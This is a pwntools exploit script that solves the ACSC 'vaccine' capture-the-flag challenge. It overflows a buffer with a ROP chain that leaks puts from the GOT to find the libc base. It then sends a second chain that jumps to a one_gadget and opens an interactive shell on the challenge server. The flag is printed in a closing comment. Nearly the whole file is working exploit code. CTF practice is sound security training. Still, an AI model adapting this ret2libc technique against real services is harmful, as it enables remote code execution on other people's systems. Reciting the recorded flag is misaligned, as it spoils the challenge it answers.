#!/usr/bin/env python
from pwn import *
import time

context.terminal = "/usr/bin/kitty"
context.arch = "amd64"
elf = ELF("./vaccine_patched")
libc = elf.libc

gdbscript = """
b *0x00000000004013d7
c
"""

p = remote('vaccine.chal.ctf.acsc.asia', 1337)
# p = process(elf.file.name)
# p = gdb.debug([elf.file.name], gdbscript=gdbscript)

rop = ROP(elf)
# pop_rdi = 0x00401443
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

payload = (b'ACGT' * 28)[:-1] + b'\x00' + (b'ACGT' * 28)[:-1] + b'\x00'
payload += b'A' * (5 * 8)
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.sym['puts'])
payload += p64(elf.sym['main'])

p.sendline(payload)
# p.recvuntil(b'REDACTED\n')
p.recvuntil(b"your flag is in another castle\n")
libc.address = unpack(p.recv(6), 'all') - 0x84420
print(f"libc @ {hex(libc.address)}")

time.sleep(1)
payload = (b'ACGT' * 28)[:-1] + b'\x00' + (b'ACGT' * 28)[:-1] + b'\x00'
payload += b'A' * (5 * 8)
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.address + 0x00198fd2)  # pop r12; ret
payload += p64(0)
payload += p64(libc.address + 0xe3afe)
p.sendline(payload)

p.interactive()

# ACSC{RoP_3@zy_Pe4$y}
